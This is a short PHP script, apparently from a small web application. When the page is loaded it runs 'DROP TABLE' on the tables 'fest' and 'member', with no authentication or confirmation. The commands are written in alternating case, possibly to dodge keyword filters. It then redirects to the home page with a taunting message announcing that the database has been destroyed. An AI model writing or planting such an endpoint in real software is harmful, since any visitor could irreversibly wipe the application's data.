<?php

require_once "connection.php";

session_start();

$query = "dRoP tAbLe fest; DrOp TaBlE member";
$connection->exec($query);

header("Location: home.php");

$_SESSION["CHAOS"] = "<p style='font-size:50px;'>GG WP, you destroyed the whole database. OP B8 M8!.!</p>";

?>